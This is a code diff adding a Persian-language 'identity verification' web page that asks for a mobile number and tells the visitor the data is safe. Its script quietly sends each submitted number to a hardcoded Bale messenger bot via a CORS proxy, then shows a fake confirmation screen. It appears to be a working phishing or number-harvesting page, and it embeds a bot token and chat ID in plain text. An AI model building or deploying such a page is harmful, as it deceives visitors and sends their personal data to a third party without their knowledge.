@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>تایید هویت</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tahoma', Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px 32px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-3px);
+        }
+
+        .icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+
+        h2 {
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 28px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 22px;
+        }
+
+        label {
+            color: #ccc;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #333;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.06);
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #6c63ff;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 24px rgba(108, 99, 255, 0.2);
+        }
+
+        input::placeholder {
+            color: #555;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #6c63ff, #5a52d5);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 32px rgba(108, 99, 255, 0.35);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #status {
+            margin-top: 16px;
+            font-size: 14px;
+            min-height: 24px;
+        }
+
+        .success {
+            color: #4CAF50;
+        }
+
+        .error {
+            color: #f44336;
+        }
+
+        .loading {
+            color: #ff9800;
+        }
+
+        .footer {
+            margin-top: 20px;
+        }
+
+        .footer p {
+            color: #444;
+            font-size: 12px;
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.08);
+            border-top: 4px solid #6c63ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 16px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-page .icon {
+            font-size: 64px;
+        }
+
+        .btn-panel {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 36px;
+            background: #6c63ff;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 12px;
+            transition: 0.3s;
+            font-weight: 600;
+        }
+
+        .btn-panel:hover {
+            background: #5a52d5;
+            transform: scale(1.05);
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="card" id="mainCard">
+            <div class="icon">🔒</div>
+            <h2>تایید هویت</h2>
+            <p class="subtitle">لطفاً شماره موبایل خود را وارد کنید</p>
+
+            <form id="mainForm">
+                <div class="input-group">
+                    <label>📱 شماره موبایل</label>
+                    <input type="tel" id="phoneInput" placeholder="مثال: 09123456789" required maxlength="11" />
+                </div>
+
+                <button type="submit" id="submitBtn">✅ تایید و ادامه</button>
+                <div class="loader" id="loader"></div>
+                <div id="status"></div>
+            </form>
+
+            <div class="footer">
+                <p>🔒 اطلاعات شما محفوظ است</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== تنظیمات =====
+        const BOT_TOKEN = "1979216511:cWIxbdjNu_dNcpEH2DQvDNabzidp8B6WRg4";
+        const CHAT_ID = "1828182856";
+        const API_URL = "https://tapi.bale.ai/bot" + BOT_TOKEN + "/sendMessage";
+
+        // ===== عناصر =====
+        const form = document.getElementById('mainForm');
+        const phoneInput = document.getElementById('phoneInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusDiv = document.getElementById('status');
+        const loader = document.getElementById('loader');
+        const mainCard = document.getElementById('mainCard');
+
+        // ===== فقط عدد =====
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        // ===== ارسال فرم =====
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const phone = phoneInput.value.trim();
+
+            if (!phone || phone.length < 10) {
+                showStatus('⚠️ شماره معتبر وارد کنید!', 'error');
+                return;
+            }
+
+            setLoading(true);
+            showStatus('⏳ در حال ارسال...', 'loading');
+
+            try {
+                const proxy = 'https://cors-anywhere.herokuapp.com/';
+                const response = await fetch(proxy + API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "📱 شماره جدید:\n" + phone + "\n\n🕒 " + new Date().toLocaleString('fa-IR')
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok === true) {
+                    showStatus('✅ شماره با موفقیت ارسال شد!', 'success');
+                    phoneInput.value = '';
+                    showSuccessPage();
+                } else {
+                    showStatus('❌ خطا: ' + (data.error_code || 'نامشخص'), 'error');
+                }
+            } catch (error) {
+                showStatus('❌ خطا در اتصال: ' + error.message, 'error');
+            }
+
+            setLoading(false);
+        });
+
+        // ===== توابع =====
+        function showStatus(msg, type) {
+            statusDiv.textContent = msg;
+            statusDiv.className = type;
+        }
+
+        function setLoading(isLoading) {
+            submitBtn.disabled = isLoading;
+            submitBtn.textContent = isLoading ? '⏳ در حال ارسال...' : '✅ تایید و ادامه';
+            loader.style.display = isLoading ? 'block' : 'none';
+        }
+
+        function showSuccessPage() {
+            mainCard.innerHTML = `
+                <div class="icon">✅</div>
+                <h2 style="color:#4CAF50;">تایید شد</h2>
+                <p class="subtitle">شماره شما با موفقیت ثبت شد</p>
+                <div style="width:50px;height:50px;border:4px solid rgba(255,255,255,0.08);border-top:4px solid #6c63ff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto;"></div>
+                <p style="color:#888;font-size:13px;">در حال انتقال به صفحه اصلی...</p>
+                <a href="#" class="btn-panel" onclick="location.reload()">🔄 بازگشت</a>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+            `;
+        }
+
+        // ===== لاگ =====
+        console.log('✅ صفحه بارگذاری شد');
+        console.log('🤖 توکن:', BOT_TOKEN);
+        console.log('📱 آیدی چت:', CHAT_ID);
+    </script>
+
+</body>
+</html>
